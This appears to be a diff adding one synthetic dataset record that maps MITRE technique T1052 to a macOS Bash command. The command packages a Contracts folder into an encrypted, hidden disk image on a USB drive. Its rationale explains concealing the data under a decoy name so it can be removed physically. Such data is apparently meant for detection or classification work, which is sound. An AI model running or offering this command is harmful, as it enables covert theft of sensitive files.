@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "printf 's3cr3tP@ss\\n' | hdiutil create -srcfolder ~/Documents/Contracts -format UDZO -encryption AES-256 -stdinpass -volname \"PhotoCache\" /Volumes/USB/.PhotoCache.dmg",
+  "explanation": "Creates an encrypted, compressed disk image of a sensitive folder directly on the USB to conceal and stage data for physical exfiltration.",
+  "rationale_steps": [
+    "Selectively package sensitive content into a single container.",
+    "Apply encryption to hinder casual inspection if discovered.",
+    "Write directly to removable storage for offline removal.",
+    "Use benign-looking volume name to blend in."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-19e64b98-f97bb8ff",
+  "source_prompt_hash": "19e64b98",
+  "timestamp_utc": "2025-09-30T05:31:52.812086Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
